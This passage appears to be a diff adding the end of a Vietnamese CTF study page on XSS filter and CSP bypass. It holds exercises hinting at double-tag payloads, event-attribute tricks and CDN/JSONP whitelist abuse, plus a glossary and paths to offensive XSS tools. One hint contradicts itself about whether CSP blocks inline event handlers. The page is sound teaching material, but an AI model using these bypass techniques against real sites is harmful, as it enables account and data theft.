+    <tr><td>✅</td><td>Đã xác nhận có XSS thật (input phản chiếu/lưu lại), nhưng payload cơ bản bị 1 lớp filter/CSP chặn — cần kỹ thuật né cụ thể.</td></tr>
+    <tr><td>❌</td><td>App dùng thư viện sanitize chuẩn với allowlist chặt (DOMPurify, bleach) — các kỹ thuật blacklist-bypass ở đây không áp dụng được, cần tìm lỗ hổng khác trong chính cấu hình allowlist (hiếm, nâng cao hơn nhiều).</td></tr>
+    <tr><td>❌</td><td>CSP có <code>script-src 'none'</code> và không có bất kỳ domain whitelist nào — gần như không còn đường nào để chạy JS, trừ khi tìm được lỗi trong chính browser (ngoài phạm vi CTF web thông thường).</td></tr>
+  </table>
+ </div>
+</section>
+
+<!-- 13 -->
+<section class="block" id="s13">
+ <div class="wrap">
+  <div class="secnum">13 / BÀI TẬP & THUẬT NGỮ</div>
+  <h2>Luyện tập</h2>
+  <p>⭐ <strong>Làm lại:</strong> dựng 1 Flask app nhỏ với filter
+  <code>input.replace("&lt;script&gt;", "")</code> (không đệ quy), tự tìm payload double-tag để né.</p>
+  <details><summary>Gợi ý nếu kẹt</summary>Ghép sao cho sau khi xoá đúng 1 chuỗi <code>&lt;script&gt;</code>,
+  phần còn lại ghép thành đúng 1 tag hợp lệ hoàn chỉnh.</details>
+
+  <p>⭐⭐ <strong>Đổi 1 biến:</strong> thêm header <code>Content-Security-Policy: script-src 'self'</code> vào
+  app trên, thử lại payload double-tag cũ — quan sát alert có còn chạy không (vẫn chạy nếu payload không dùng
+  <code>&lt;script&gt;</code> inline mà dùng event attribute như <code>onload</code>).</p>
+  <details><summary>Gợi ý nếu kẹt</summary>CSP <code>script-src</code> chỉ chặn THẺ <code>&lt;script&gt;</code>
+  và <code>javascript:</code> URL, KHÔNG chặn event attribute như <code>onload=</code> trừ khi có thêm
+  <code>unsafe-inline</code> bị loại bỏ RÕ RÀNG khỏi mọi ngữ cảnh — thực ra CSP chuẩn cũng chặn inline event
+  attribute nếu không có <code>'unsafe-inline'</code>; hãy tự thử nghiệm thực tế trên trình duyệt để thấy rõ.</details>
+
+  <p>⭐⭐⭐⭐ <strong>Tự nghĩ:</strong> CSP cho phép <code>script-src 'self' https://cdn.jsdelivr.net</code>.
+  Giải thích vì sao việc whitelist cả 1 domain CDN lớn như vậy có thể là lỗ hổng, và cách kẻ tấn công lợi dụng.</p>
+  <details><summary>Gợi ý nếu kẹt</summary>CDN lớn host HÀNG NGÀN thư viện JS khác nhau — kẻ tấn công tìm 1
+  thư viện CÓ SẴN trên chính CDN đó mà có hành vi "nguy hiểm" tận dụng được (vd thư viện cũ có lỗ hổng
+  <code>eval</code> nội bộ, hoặc 1 thư viện tự thực thi code từ tham số URL) — gọi là "JSONP bypass" khi dùng
+  domain whitelist để nạp 1 endpoint JSONP công khai tuỳ biến được tham số callback.</details>
+
+  <h2>Thuật ngữ</h2>
+  <table>
+    <tr><td>Blacklist / Allowlist</td><td>Cách lọc theo "danh sách cấm" (dễ bị né) vs "danh sách cho phép" (an toàn hơn).</td></tr>
+    <tr><td>CSP (Content-Security-Policy)</td><td>Header giới hạn nguồn script được phép chạy trên trang.</td></tr>
+    <tr><td>Polyglot payload</td><td>1 chuỗi kích hoạt được ở nhiều ngữ cảnh HTML khác nhau cùng lúc.</td></tr>
+    <tr><td>mXSS (Mutation XSS)</td><td>XSS xảy ra do trình duyệt tự "sửa"/chuẩn hoá lại HTML khi parse, tạo ra cấu trúc nguy hiểm không có trong input gốc.</td></tr>
+  </table>
+  <p style="margin-top:16px"><strong>Công cụ offline:</strong> <code>~/hoc/CTF/Tools/web/XSStrike/</code>,
+  <code>~/hoc/CTF/Tools/web/PayloadsAllTheThings/XSS Injection/</code>.</p>
+ </div>
+</section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <p>Chỉ dùng cho học tập &amp; thi CTF hợp pháp, trong phạm vi được cấp phép (F-Hacker 2026 Bảng C và tương tự).</p>
+  </div>
+</footer>
+
+<script>
+(function(){
+  "use strict";
+  var btn=document.getElementById("themeBtn");
+  function cur(){var a=document.documentElement.getAttribute("data-theme");if(a)return a;return window.matchMedia("(prefers-color-scheme:dark)").matches?"dark":"light";}
+  btn.addEventListener("click",function(){var n=cur()==="dark"?"light":"dark";document.documentElement.setAttribute("data-theme",n);try{localStorage.setItem("xssbypass-theme",n);}catch(e){}});
+  try{var s=localStorage.getItem("xssbypass-theme");if(s)document.documentElement.setAttribute("data-theme",s);}catch(e){}
+})();
+</script>
